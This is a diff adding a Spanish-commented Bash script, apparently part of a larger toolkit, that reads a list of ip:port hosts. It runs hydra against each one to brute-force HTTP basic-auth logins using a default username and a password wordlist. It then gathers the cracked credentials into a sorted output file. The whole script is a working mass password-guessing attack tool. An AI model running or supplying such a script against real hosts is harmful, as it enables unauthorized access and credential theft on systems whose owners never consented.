@@ -1,0 +1,43 @@
+#!/bin/bash
+# uso: hydra_check_list listadehosts ficherodesalida
+# listadehosts en formato:
+# 1.2.3.4:8080
+# ========================
+
+HYDRATEMPLOGFILE="/tmp/$(basename $0).$$.tmp"
+HYDRATEMPDEBUGFILE="/tmp/$(basename $0).$$.debug"
+rm -rf hydra.restore
+touch "${HYDRATEMPLOGFILE}"
+total=$(cat "$1" | wc -l)
+while read linea
+do
+  let counter=counter+1
+  ip=$(echo ${linea} | cut -d":" -f1)
+  puerto=$(echo ${linea} | cut -d":" -f2)
+  echolog "[Hydra] [${counter}/${total}] Atacando ${ip}:${puerto}"
+  echolog2 "HYDRA: DEFAULTLOGIN       = ${DEFAULTLOGIN}"
+  echolog2 "HYDRA: WORDLISTFILEPATH   = ${WORDLISTFILEPATH}"
+  echolog2 "HYDRA: HYDRATEMPLOGFILE   = ${HYDRATEMPLOGFILE}"
+  echolog2 "HYDRA: HYDRA_URL          = ${HYDRA_URL}"
+  echolog2 "HYDRA: HYDRATEMPDEBUGFILE = ${HYDRATEMPDEBUGFILE}"
+  hydra -l "${DEFAULTLOGIN}" -P "${WORDLISTFILEPATH}" -o "${HYDRATEMPLOGFILE}"  -s "${puerto}" -m "${HYDRA_URL}" "${ip}" http-get >> "${HYDRATEMPDEBUGFILE}" 2>&1 
+  ## hydra -l "${DEFAULTLOGIN}" -P "${WORDLISTFILEPATH}" -o "${HYDRATEMPLOGFILE}"  -s "${puerto}" -m "${HYDRA_URL}" "${ip}" http-get
+  echo >> ${HYDRATEMPLOGFILE}
+  ## algunas versiones de hydra no ponen un salto de linea al final del log, 
+  ## asi que si vamos a concatenar unas cuantas ejecuciones de hydra en un solo log, nos dara problemas para parsearlo.
+  ## una linea en blanco extra no duele y asegura que no suceda este problema, sin afectar a versiones "sanas" de hydra 
+done < $1
+
+# procesa la salida de hydra que hemos guardado temporalmente en hydra.log, la adecenta un poco para que sea legible
+# y luego la manda al fichero de salida que se nos habia solicitado escribir
+echolog2 "limpiando formato de ${HYDRATEMPLOGFILE}"
+
+clean_hydra_format_junk "${HYDRATEMPLOGFILE}" "${HYDRATEMPLOGFILE}.clean"
+rm -rf "${HYDRATEMPLOGFILE}"
+
+echolog2 "ordenando ${HYDRATEMPLOGFILE}.clean y escribiendo en $2"
+
+# y por si acaso, un poco de orden y filtrado de unicos
+cat "${HYDRATEMPLOGFILE}.clean" | sort -u > "$2"
+rm -rf "${HYDRATEMPLOGFILE}.clean"
+
